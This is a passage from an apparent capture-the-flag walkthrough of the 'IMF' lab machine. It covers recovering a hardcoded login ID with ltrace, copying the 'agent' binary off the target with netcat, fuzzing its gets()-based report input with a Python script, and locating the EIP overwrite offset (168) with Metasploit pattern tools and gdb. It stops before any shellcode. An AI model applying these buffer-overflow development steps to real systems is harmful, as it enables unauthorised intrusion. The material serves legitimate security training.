    <div>Â Â ___ __Â Â __ ___ </div>
    <div> |_ _|Â Â \/Â Â | __|Â Â Agent</div>
    <div>Â Â | || |\/| | _|Â Â Â Reporting</div>
    <div> |___|_|Â Â |_|_|Â Â Â Â System</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Agent ID : 1234</div>
    <div>Invalid Agent ID</div>
</div>
<div><br /></div>
<div>Now, if we take a look at our trace data we captured...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ cat /tmp/agent-trace</div>
    <div>SYS_brk(0xf770b4c2)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0x88b4000</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_mmap2(0, 4, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xf76f1000</div>
    <div>SYS_access("/etc/ld.so.preload", 04)Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\203\304\020\205\300xD\203\354\004\211\303\215D$\004PSj\003\350B\206", -143587944, 02000000) = 3</div>
    <div>SYS_fstat64(0xf770517e, 3, 3, 0xffa942a0)Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0, 0, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xf76e9000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\203\304\020\203\370\377\211E\330\017\204z\002", -143715952, 02000000) = 3</div>
    <div>SYS_read(-143673437, "\003\004\005\006\a\b\t\n\v\f\r\016\017\020\021\022\023\024\025\026\027\030\031\032\033\034\035\036\037 !""..., 4289283008) = 512</div>
    <div>SYS_fstat64(0xf76fa345, 3, 3, 0xffa942e0)Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0, 0, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xf7535000</div>
    <div>SYS_mprotect(0xf76fb170, -143777792, 4096)Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0, 0, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xf76e3000</div>
    <div>SYS_mmap2(0, 0, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xf76e6000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0xffa94630, 0, 0xf7718000, 0)Â Â Â Â Â Â Â Â Â Â = 0xf7534000</div>
    <div>SYS_set_thread_area(0xf7534700, 0xfffff, 81, 0)Â Â = 0</div>
    <div>SYS_mprotect(0xf7700017, -143773696, 8192)Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xf7700017, 134520832, 4096)Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xf7700017, -143560704, 4096)Â Â Â Â Â Â Â = 0</div>
    <div>SYS_munmap(0xf76e9000, 31719)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>__libc_start_main(0x80485fb, 1, 0xffa94974, 0x8048970 &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â setbuf(0xf76e5d60, 0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = &lt;void&gt;</div>
    <div>Â Â Â Â asprintf(0xffa948a8, 0x80489f0, 0x2ddd984, 0xf754d0ec &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_brk(0xf76e5000)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0x88b4000</div>
    <div>Â Â Â Â Â Â Â Â SYS_brk(0xf76e5000)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0x88d5000</div>
    <div>Â Â Â Â &lt;... asprintf resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 8</div>
    <div>Â Â Â Â puts("Â Â ___ __Â Â __ ___ " &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(17, "Â Â ___ __Â Â __ ___ ", 4150301667) = 17</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(1, "\nphn\367\377\377\377\377\377\377\377\377", 4150301667) = 1</div>
    <div>Â Â Â Â &lt;... puts resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 18</div>
    <div>Â Â Â Â puts(" |_ _|Â Â \\/Â Â | __|Â Â Agent" &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(24, " |_ _|Â Â \\/Â Â | __|Â Â Agent", 4150301667) = 24</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(1, "\nphn\367\377\377\377\377\377\377\377\377", 4150301667) = 1</div>
    <div>Â Â Â Â &lt;... puts resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 25</div>
    <div>Â Â Â Â puts("Â Â | || |\\/| | _|Â Â Â Reporting" &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(28, "Â Â | || |\\/| | _|Â Â Â Reporting", 4150301667) = 28</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(1, "\nphn\367\377\377\377\377\377\377\377\377", 4150301667) = 1</div>
    <div>Â Â Â Â &lt;... puts resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 29</div>
    <div>Â Â Â Â puts(" |___|_|Â Â |_|_|Â Â Â Â System\n" &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(26, " |___|_|Â Â |_|_|Â Â Â Â System\n", 4150301667) = 26</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(1, "\nphn\367\377\377\377\377\377\377\377\377", 4150301667) = 1</div>
    <div>Â Â Â Â &lt;... puts resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 27</div>
    <div>Â Â Â Â printf("\nAgent ID : " &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(12, "\nAgent ID : ", 4150301667) = 12</div>
    <div>Â Â Â Â &lt;... printf resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 12</div>
    <div>Â Â Â Â fgets( &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_fstat64(0xffa946a0, 0xffa946a0, 0xf7608a35, 0xf76e5000) = 0</div>
    <div>Â Â Â Â Â Â Â Â SYS_read(4096, "1234\n", 4150301555)Â Â Â Â Â = 5</div>
    <div>Â Â Â Â &lt;... fgets resumed&gt; "1234\n", 9, 0xf76e55a0) = 0xffa948ae</div>
    <div>Â Â Â Â <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">strncmp("1234\n", "48093572", 8)</font>Â Â Â Â Â Â Â Â Â Â Â Â Â = -1</div>
    <div>Â Â Â Â puts("Invalid Agent ID " &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(17, "Invalid Agent ID ", 4150301667) = 17</div>
    <div>Â Â Â Â Â Â Â Â SYS_write(1, "\nphn\367\377\377\377\377\377\377\377\377", 4150301667) = 1</div>
    <div>Â Â Â Â &lt;... puts resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 18</div>
    <div>Â Â Â Â SYS_exit_group(1 &lt;no return ...&gt;</div>
    <div>+++ exited (status 254) +++</div>
</div>
<div><br /></div>
<div>Interesting. We can see the strncmp call comparing what we entered (1234) to what it is looking for (48093572). Let's run our program again and try the new Agent ID.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ ltrace -CS -n 4 -o /tmp/agent-trace ./agent</div>
    <div>Â Â ___ __Â Â __ ___ </div>
    <div> |_ _|Â Â \/Â Â | __|Â Â Agent</div>
    <div>Â Â | || |\/| | _|Â Â Â Reporting</div>
    <div> |___|_|Â Â |_|_|Â Â Â Â System</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Agent ID : 48093572</div>
    <div>Login Validated </div>
    <div>Main Menu:</div>
    <div>1. Extraction Points</div>
    <div>2. Request Extraction</div>
    <div>3. Submit Report</div>
    <div>0. Exit</div>
    <div>Enter selection:</div>
</div>
<div><br /></div>
<div>Great! ðŸ˜„ Working through the menu items, the "Request Extraction" and "Submit Report" items both allow user input that is echoed back to the screen. Looking at the trace for each, we can see:</div>
<ul>
    <li>
        <div>"Request Extraction" uses fgets to get input from the user until it hits a return... it then calls getchar</div>
    </li>
    <li>
        <div>"Submit Report" uses gets to get input from the user until it hits a return</div>
    </li>
</ul>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Request Extraction</div>
    <div>Â Â Â Â fgets( &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_read(4096, "test\n", 4150539123)Â Â Â Â Â = 5</div>
    <div>Â Â Â Â &lt;... fgets resumed&gt; "test\n", 55, 0xf771f5a0) = 0xfff55fb7</div>
    <div>Â Â Â Â getchar(0xfff55ff8, 0x74743ff0, 0xa747365, 0 &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_read(4096, "\n", 4150539123)Â Â Â Â Â Â Â Â Â = 1</div>
    <div>Â Â Â Â &lt;... getchar resumed&gt; )Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 10</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Submit Report</div>
    <div>Â Â Â Â gets(0xff9d0a34, 0x8048278, 1, 0xf77ec918 &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â Â Â Â Â SYS_read(4096, "test\n", 4151169907)Â Â Â Â Â = 5</div>
    <div>Â Â Â Â &lt;... gets resumed&gt; )</div>
</div>
<div><br /></div>
<div>Checking on <a href="https://www.geeksforgeeks.org/fgets-gets-c-language/" target="_blank">these functions</a>, we know that gets is more susceptible to buffer overflows. Looks like we are back to trying to find a buffer overflow in the program. Oh joy! I'll go ahead and transfer the binary to my attacking machine using netcat and start the process of trying to find a buffer overflow.</div>
<div><br /></div>
<div>On my attacking machine...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# nc -vlp 4321 &gt; agent</div>
    <div>listening on [any] 4321 ...</div>
    <div>connect to [10.183.0.222] from imf.homenet.dom [10.183.0.188] 42894</div>
</div>
<div><br /></div>
<div>On the victim...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>www-data@imf:/usr/local/bin$ nc 10.183.0.222 4321 &lt; agent</div>
</div>
<div><br /></div>
<div>Now that we have the agent binary, we'll create a python script to run the application and start sending an increasing amount of 'A's to the Submit Report option until we crash the process.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# cat fuzz.py</div>
    <div>#!/usr/bin/python</div>
    <div>
        <div><br /></div>
    </div>
    <div>import pexpect</div>
    <div>
        <div><br /></div>
    </div>
    <div># create an array of buffers (31), from 1,100,200...3000 (increments of 100).</div>
    <div>buffer=["A"]</div>
    <div>counter=100</div>
    <div>while len(buffer) &lt;= 30:</div>
    <div>Â Â buffer.append("A"*counter)</div>
    <div>Â Â counter=counter+100</div>
    <div>
        <div><br /></div>
    </div>
    <div># start sending each buffer to see if/when the program crashes</div>
    <div>for string in buffer:</div>
    <div>Â Â try:</div>
    <div>Â Â Â Â print "Fuzzing with %s bytes" % len(string)</div>
    <div>Â Â Â Â child = pexpect.spawn('./agent')</div>
    <div>Â Â Â Â child.expect('Agent ID : ')</div>
    <div>Â Â Â Â child.sendline('48093572')</div>
    <div>Â Â Â Â child.expect('Enter selection: ')</div>
    <div>Â Â Â Â child.sendline('3')</div>
    <div>Â Â Â Â child.expect('Enter report update: ')</div>
    <div>Â Â Â Â child.sendline(string)</div>
    <div>Â Â Â Â child.expect(pexpect.EOF)</div>
    <div>Â Â Â Â child.close()</div>
    <div>Â Â Â Â if child.exitstatus is None:</div>
    <div>Â Â Â Â Â Â returncode = child.signalstatus</div>
    <div>Â Â Â Â else:</div>
    <div>Â Â Â Â Â Â returncode = child.exitstatus</div>
    <div>Â Â Â Â if returncode == 11:</div>
    <div>Â Â Â Â Â Â raise BufferError("Crashed! %s" % returncode)</div>
    <div>Â Â except BufferError as error:</div>
    <div>Â Â Â Â print "Buffer overflow detected with %s bytes" % len(string)</div>
    <div>Â Â Â Â break</div>
    <div>Â Â except:</div>
    <div>Â Â Â Â print(str(child))</div>
    <div>Â Â Â Â break</div>
</div>
<div><br /></div>
<div>When we run this, we get the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# python fuzz.py </div>
    <div>Fuzzing with 1 bytes</div>
    <div>Fuzzing with 100 bytes</div>
    <div>Fuzzing with 200 bytes</div>
    <div>Buffer overflow detected with 200 bytes</div>
</div>
<div><br /></div>
<div>Good start. Now we can generate our unique string using pattern_create.rb and see exactly how many 'A's it takes to overwrite the eip (Extended Instruction Pointer).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 250 &gt; pattern.txt</div>
</div>
<div><br /></div>
<div>Debugging the program using gdb, we get the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# gdb -q agent</div>
    <div>Reading symbols from agent...(no debugging symbols found)...done.</div>
    <div>(gdb) run</div>
    <div>Starting program: /root/Walkthroughs/imf/agent</div>
    <div>Â Â ___ __Â Â __ ___</div>
    <div> |_ _|Â Â \/Â Â | __|Â Â Agent</div>
    <div>Â Â | || |\/| | _|Â Â Â Reporting</div>
    <div> |___|_|Â Â |_|_|Â Â Â Â System</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>Agent ID : 48093572</div>
    <div>Login Validated</div>
    <div>Main Menu:</div>
    <div>1. Extraction Points</div>
    <div>2. Request Extraction</div>
    <div>3. Submit Report</div>
    <div>0. Exit</div>
    <div>Enter selection: 3</div>
    <div>
        <div><br /></div>
    </div>
    <div>Enter report update: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1AeA</div>
    <div>Report: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A</div>
    <div>Submitted for review.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>
        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">0x41366641</font> in ?? ()
    </div>
</div>
<div><br /></div>
<div>The crash returns the invalid information (our pattern) it hit in the eip. Now, we can use pattern_offset.rb to see exactly where that part of our pattern is (so we know how many bytes we have to send to overwrite eip).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">41366641</font>
    </div>
    <div>[*] Exact match at offset 168</div>
</div>
<div><br /></div>
<div>Now we want to try to send 168 'A's, 4 'B's and (700-168-4) 'C's. We are sending the 'C's to see how much we can overflow the buffer (so we know how much space we might have for our exploit). We'll use python to build our string.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# python -c 'print "A"*168 + "B"*4 + "C"*(700-168-4)'</div>
    <div>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div>
    <div>AAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</div>
    <div>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</div>
    <div>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</div>
</div>
<div><br /></div>
<div>Running the program in our debugger again, it looks like our eip is full of 'B's now (0x42424242), which is exactly what we wanted.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC</div>
    <div>Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC</div>
    <div>Submitted for review.</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x42424242 in ?? ()</div>
    <div>(gdb) info registers</div>
    <div>eaxÂ Â Â Â Â Â Â Â Â Â Â Â 0xffffcfb4Â Â Â Â Â Â Â Â Â Â -12364</div>
    <div>ecxÂ Â Â Â Â Â Â Â Â Â Â Â 0xf7fa2890Â Â Â Â Â Â Â Â Â Â -134600560</div>
    <div>edxÂ Â Â Â Â Â Â Â Â Â Â Â 0x16Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 22</div>
    <div>ebxÂ Â Â Â Â Â Â Â Â Â Â Â 0x0Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 0</div>
    <div>espÂ Â Â Â Â Â Â Â Â Â Â Â 0xffffd060Â Â Â Â Â Â Â Â Â Â 0xffffd060</div>
    <div>ebpÂ Â Â Â Â Â Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â Â Â Â Â 0x41414141</div>
    <div>esiÂ Â Â Â Â Â Â Â Â Â Â Â 0xf7fa1000Â Â Â Â Â Â Â Â Â Â -134606848</div>
    <div>ediÂ Â Â Â Â Â Â Â Â Â Â Â 0xf7fa1000Â Â Â Â Â Â Â Â Â Â -134606848</div>
    <div>eipÂ Â Â Â Â Â Â Â Â Â Â Â 0x42424242Â Â Â Â Â Â Â Â Â Â 0x42424242</div>
    <div>eflagsÂ Â Â Â Â Â Â Â Â 0x10282Â Â Â Â Â Â Â Â Â Â Â Â Â [ SF IF RF ]</div>
    <div>csÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x23Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 35</div>
    <div>ssÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x2bÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 43</div>
    <div>dsÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x2bÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 43</div>
    <div>esÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x2bÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 43</div>
    <div>fsÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x0Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 0</div>
    <div>gsÂ Â Â Â Â Â Â Â Â Â Â Â Â 0x63Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 99</div>
</div>
<div><br /></div>
<div>Also, checking the eax register, we can see our ABCs are filling the register pretty well, but there is one random 4 bytes (the eax address?) that we didn't write. We can also see that our 'C's had no problem filling up as much space as we want.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>(gdb) x/152x $eax</div>
    <div>
        <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">0xffffcfb4</font>:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141
    </div>
    <div>0xffffcfc4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffcfd4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffcfe4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffcff4:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd004:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd014:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd024:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd034:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd044:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">0xffffcfb4</font>Â Â Â Â Â Â 0x41414141</div>
    <div>0xffffd054:Â Â Â Â Â 0x41414141Â Â Â Â Â Â 0x41414141Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x42424242</font>Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd064:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd074:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd084:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd094:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0a4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0b4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0c4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0d4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0e4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd0f4:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
    <div>0xffffd104:Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343Â Â Â Â Â Â 0x43434343</div>
